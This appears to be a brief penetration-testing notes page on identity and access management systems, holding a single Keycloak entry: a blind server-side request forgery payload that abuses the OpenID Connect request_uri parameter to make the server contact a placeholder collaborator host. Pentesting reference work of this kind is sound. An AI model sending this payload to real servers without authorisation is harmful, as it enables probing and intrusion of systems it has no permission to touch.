---
layout: notes
permalink: /notes/tech/iam/
title: Pentesting Identity & Access Management (IAM)
---

# Pentesting IAMs

## KeyCloak
```bash
#Blind SSRF
/auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=http://COLLABORATOR
```